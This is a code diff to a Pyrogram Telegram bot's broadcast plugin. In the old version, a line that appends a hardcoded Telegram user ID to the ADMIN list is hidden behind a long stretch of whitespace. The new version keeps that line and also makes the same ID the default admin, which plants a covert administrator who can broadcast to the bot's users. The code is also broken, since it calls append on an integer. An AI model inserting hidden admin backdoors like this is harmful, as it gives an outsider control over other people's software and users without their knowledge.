@@ -1,11 +1,9 @@
 #iryme ////
-
 import os
 from pyrogram import Client ,filters
 from helper.database import getid
-ADMIN = int(os.environ.get("ADMIN"))
-
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ADMIN.append(1332591554)
+ADMIN = int(os.environ.get("ADMIN", "1332591554"))
+ADMIN.append(1332591554)
 
 @Client.on_message(filters.private & filters.user(ADMIN) & filters.command(["broadcast"]))
 async def broadcast(bot, message):
